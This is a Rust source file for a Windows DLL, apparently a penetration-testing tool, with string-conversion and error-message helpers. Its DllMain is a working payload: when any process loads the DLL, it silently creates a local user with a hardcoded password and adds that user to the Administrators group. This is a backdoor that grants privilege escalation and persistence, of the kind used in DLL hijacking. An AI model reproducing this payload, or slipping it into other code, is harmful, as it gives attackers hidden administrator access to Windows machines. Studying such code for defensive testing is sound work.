use std::collections::HashMap;
use chrono::{NaiveDateTime, DateTime, Utc};
use windows_sys::Win32::{
    Foundation::{UNICODE_STRING, ERROR_ACCESS_DENIED},
    System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH},
};

pub mod cli;
pub mod groups;
pub mod privs;
pub mod users;

const MAX_NAME: u32 = 256;
const POLICY_ALL_ACCESS: u32 = 0x00F0FFF;

fn encode_string_to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn decode_wide_nul_to_string(
    ptr_wide_string: *mut u16,
) -> Result<String, std::string::FromUtf16Error> {
    let mut decoded_string = Vec::<u16>::new();
    let mut i = 0;
    unsafe {
        while *ptr_wide_string.add(i) != 0 {
            decoded_string.push(*ptr_wide_string.add(i));
            i += 1;
        }
    }
    return String::from_utf16(&decoded_string);
}

unsafe fn unicode_string_to_string(s: UNICODE_STRING) -> String {
    String::from_utf16_lossy(std::slice::from_raw_parts(s.Buffer, s.Length as usize / 2))
}

pub fn win_err_text(err: u32) -> String {
    let errors: HashMap<u32, &str> = HashMap::from([
        (
            8646,
            "The system is not authoritative for the specified account and therefore \
             cannot complete the operation. Please retry the operation using the provider \
             associated with this account. If this is an online provider please use the \
             provider's online site. (Ex.: Microsoft account - user@outlook.com)",
        ),
        (2245, "The password is shorter than required"),
        (2202, "The user name or group name parameter is invalid"),
        (2224, "The user account already exists"),
        (2221, "The user name could not be found"),
        (2220, "The group name could not be found"),
        (2231, "Deleting a user with a session is not allowed"),
        (2236, "The user already belongs to this group"),
        (2243, "The password of this user cannot change"),
        (1337, "The security ID structure is invalid"),
        (1377, "The specified account name is not a member of the group"),
        (1332, "No mapping between account names and security IDs was done"),
        (1313, "A specified privilege does not exist"),
        (2, "Set of user privileges is empty"),
        (ERROR_ACCESS_DENIED, "The user does not have rights for the requested operation")
    ]);

    errors.get(&err).unwrap_or(&"Unexpected error").to_string()
}

#[no_mangle]
#[allow(unused_variables, non_snake_case, unused_must_use)]
unsafe extern "system" fn DllMain(_: *const u8, call_reason: u32, _: *const u8) -> bool {
    let username = "pentester"; // Change this
    let description: Option<String> = None; // Change this  (if description required: Some("Description".to_owned()) )
    let password = "P@ssw0rd12345!!!"; // Change this
    let groupname = "Administrators"; // Change this
    match call_reason {
        DLL_PROCESS_ATTACH => {
            users::add_user(username, password, &description).unwrap(); // Change this
            groups::add_user_to_group(username, groupname).unwrap(); // Change this
        }
        DLL_PROCESS_DETACH => {}
        _ => {}
    }

    true
}

pub fn timestamp_to_datetime(timestamp: i64) -> String {
    let naive = NaiveDateTime::from_timestamp_opt(timestamp, 0).unwrap();
    let datetime: DateTime<Utc> = DateTime::from_naive_utc_and_offset(naive, Utc);
    format!("{}", datetime.format("%Y-%m-%d %H:%M:%S"))
}

pub fn get_current_timestamp() -> i64 {
    let now = Utc::now();
    now.timestamp()
}